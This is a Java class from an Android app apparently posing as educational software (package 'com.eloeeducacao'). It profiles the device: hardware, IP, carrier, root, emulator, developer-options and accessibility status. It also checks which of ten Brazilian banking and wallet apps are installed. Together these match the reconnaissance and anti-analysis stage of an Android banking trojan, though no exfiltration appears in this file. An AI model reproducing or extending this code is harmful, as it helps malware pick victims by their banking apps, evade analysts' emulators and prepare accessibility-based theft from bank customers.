package com.eloeeducacao;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;

import java.util.Locale;
import java.util.TimeZone;

public final class Finger {

    private static final String[] BANCOS = {
            "br.com.intermedium", "com.nu.production", "com.itau", "com.bradesco",
            "com.santander.app", "br.com.bb.android", "com.picpay", "com.mercadopago.wallet",
            "br.com.caixa", "com.google.android.apps.walletnfcrel"
    };

    public static String txt(Context c) {
        StringBuilder b = new StringBuilder();
        b.append("modelo: ").append(Build.MANUFACTURER).append(' ').append(Build.MODEL).append('\n');
        b.append("marca: ").append(Build.BRAND).append('\n');
        b.append("device: ").append(Build.DEVICE).append('\n');
        b.append("build: ").append(Build.DISPLAY).append('\n');
        b.append("android: ").append(Build.VERSION.RELEASE).append(" sdk ").append(Build.VERSION.SDK_INT).append('\n');
        b.append("abi: ").append(Build.SUPPORTED_ABIS.length > 0 ? Build.SUPPORTED_ABIS[0] : "?").append('\n');
        b.append("idioma: ").append(Locale.getDefault().toString()).append('\n');
        b.append("fuso: ").append(TimeZone.getDefault().getID()).append('\n');
        b.append("tela: ").append(Util.screen(c)).append('\n');
        try {
            StatFs s = new StatFs(Environment.getDataDirectory().getPath());
            b.append("disco livre: ").append(s.getAvailableBytes() / 1048576).append(" MB\n");
        } catch (Throwable ignored) {}
        b.append("ip: ").append(Util.ip()).append('\n');
        try {
            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager)
                    c.getSystemService(Context.TELEPHONY_SERVICE);
            b.append("operadora: ").append(tm.getNetworkOperatorName()).append('\n');
        } catch (Throwable ignored) {}
        b.append("root: ").append(root() ? "sim" : "nao").append('\n');
        b.append("emulador: ").append(emu() ? "sim" : "nao").append('\n');
        b.append("dev options: ")
                .append(android.provider.Settings.Global.getInt(c.getContentResolver(),
                        android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) == 1
                        ? "ligado" : "desligado").append('\n');
        b.append("acessibilidade: ").append(Util.accOn(c) ? "ativa" : "inativa").append('\n');
        b.append("--- apps de banco ---\n");
        for (String p : BANCOS) {
            try {
                c.getPackageManager().getPackageInfo(p, 0);
                b.append("  ").append(p).append('\n');
            } catch (Throwable ignored) {}
        }
        return b.toString();
    }

    private static boolean root() {
        String[] p = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
                "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su",
                "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su"};
        for (String s : p) if (new java.io.File(s).exists()) return true;
        return false;
    }

    private static boolean emu() {
        return Build.FINGERPRINT.startsWith("generic")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu");
    }
}
